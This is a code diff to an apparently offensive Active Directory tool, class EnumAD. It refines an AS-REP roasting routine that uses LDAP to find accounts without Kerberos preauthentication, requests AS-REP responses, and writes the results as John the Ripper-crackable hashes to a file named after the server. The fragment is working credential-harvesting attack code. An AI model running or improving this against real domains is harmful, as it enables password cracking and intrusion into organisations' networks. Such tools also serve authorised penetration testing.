@@ -697,7 +697,7 @@ class EnumAD():
         users = []
         self.conn.search(self.dc_string[:-1], '(&(samaccounttype=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))', attributes=self.ldapProps, search_scope=SUBTREE)
         for entry in self.conn.entries:
-            users.append(str(entry['cn']) + '@{0}'.format(self.server))
+            users.append(str(entry['sAMAccountName']) + '@{0}'.format(self.server))
         if len(users) == 0:
             print('[ ' + colored('OK', 'green') +' ] Found {0} accounts that does not require Kerberos preauthentication'.format(len(users)))
         else:
@@ -753,6 +753,7 @@ class EnumAD():
                     msg = encoder.encode(asReq)
                     response = sendReceive(msg, domain, self.server)
                 else:
+                    print(e)
                     continue
 
             asRep = decoder.decode(response, asn1Spec=AS_REP())[0]
@@ -765,11 +766,11 @@ class EnumAD():
             print('[ ' + colored('OK', 'green') +' ] Got {0} hashes'.format(len(hashes)))
 
         if len(hashes) > 0:
-            with open('jtr_hashes.out', 'w') as f:
+            with open('{0}-jtr-hashes'.format(self.server), 'w') as f:
                 for h in hashes:
                     f.write(str(h) + '\n')
 
-            print('[ ' + colored('OK', 'green') +' ] Wrote all hashes to jtr_hashes.out')
+            print('[ ' + colored('OK', 'green') +' ] Wrote all hashes to {0}-jtr-hashes'.format(self.server))
 
 
 
